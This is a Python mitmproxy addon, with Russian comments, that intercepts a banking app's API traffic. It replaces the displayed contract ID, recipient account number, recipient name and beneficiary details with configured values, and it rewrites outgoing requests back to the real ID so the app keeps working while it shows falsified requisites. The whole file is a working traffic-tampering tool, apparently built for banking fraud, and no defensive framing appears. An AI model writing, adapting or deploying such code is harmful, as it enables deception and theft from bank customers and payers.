from mitmproxy import http
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import controller
from bank_filter import (
    is_bank_flow,
    ensure_response_decoded,
    bank_debug_enabled,
    is_jsonish_response,
    flow_statements_spravki_context,
    url_prohibit_proxy_json_mutation,
)

def get_config():
    return controller.config["reki"]

real_id = None

def response(flow: http.HTTPFlow) -> None:
    global real_id
    url = flow.request.pretty_url
    is_accounts_light = "accounts_light_ib" in url
    is_requisites = "account_group_requisites" in url

    if not is_bank_flow(flow):
        return
    if not flow.response:
        return
    if not (is_accounts_light or is_requisites):
        return
    if flow_statements_spravki_context(flow):
        return
    ensure_response_decoded(flow)
    if not flow.response.text:
        if bank_debug_enabled():
            print(f"[reki] пустой ответ: {url[:120]}")
        return

    if not is_jsonish_response(flow):
        return

    try:
        reki_cfg = get_config()
        NEW_CONTRACT = reki_cfg["contract"]
        NEW_ACCOUNT = reki_cfg["account"]
        NEW_RECIPIENT = reki_cfg["recipient"]
        NEW_BENEFICIARY = reki_cfg["beneficiary"]
    except Exception:
        return

    try:
        data = json.loads(flow.response.text)
    except Exception:
        return

    payload = data.get("payload") if isinstance(data, dict) else None
    if not real_id and isinstance(payload, list):
        if is_requisites and payload and isinstance(payload[0], dict):
            real_id = payload[0].get("id") or real_id
        elif is_accounts_light:
            for item in payload:
                if isinstance(item, dict) and "id" in item:
                    real_id = item["id"]
                    break
    
    # Подмена номера договора только у основного продукта (как в реквизитах).
    # Раньше подменяли id у ВСЕХ карт/счетов в списке — из‑за этого в «Мой банк» дублировались продукты.
    if is_accounts_light:
        if isinstance(payload, list):
            matched = False
            for item in payload:
                if not isinstance(item, dict) or "id" not in item:
                    continue
                if real_id is not None and item.get("id") == real_id:
                    item["id"] = NEW_CONTRACT
                    matched = True
            if not matched and payload:
                first = payload[0]
                if isinstance(first, dict) and "id" in first:
                    first["id"] = NEW_CONTRACT
            flow.response.text = json.dumps(data, ensure_ascii=False)
        return
    
    modified = False
    if isinstance(payload, list) and payload and isinstance(payload[0], dict):
        first = payload[0]
        if "id" in first:
            first["id"] = NEW_CONTRACT
            modified = True

        requisites = first.get("requisites")
        if isinstance(requisites, list) and requisites and isinstance(requisites[0], dict):
            req = requisites[0]
            if "recipientExternalAccount" in req:
                req["recipientExternalAccount"] = NEW_ACCOUNT
                modified = True
            if "recipient" in req:
                req["recipient"] = NEW_RECIPIENT
                modified = True
            if "beneficiaryInfo" in req:
                req["beneficiaryInfo"] = NEW_BENEFICIARY
                modified = True

    if modified:
        flow.response.text = json.dumps(data, ensure_ascii=False)

def request(flow: http.HTTPFlow) -> None:
    global real_id
    url = flow.request.pretty_url

    if not is_bank_flow(flow):
        return
    
    if "account_group_requisites" not in url:
        return

    try:
        reki_cfg = get_config()
        NEW_CONTRACT = reki_cfg["contract"]
    except Exception:
        return
    
    if real_id and "account_group_requisites" in url and f"account={NEW_CONTRACT}" in url:
        flow.request.url = url.replace(f"account={NEW_CONTRACT}", f"account={real_id}")

print("[+] reki.py загружен (динамический конфиг)")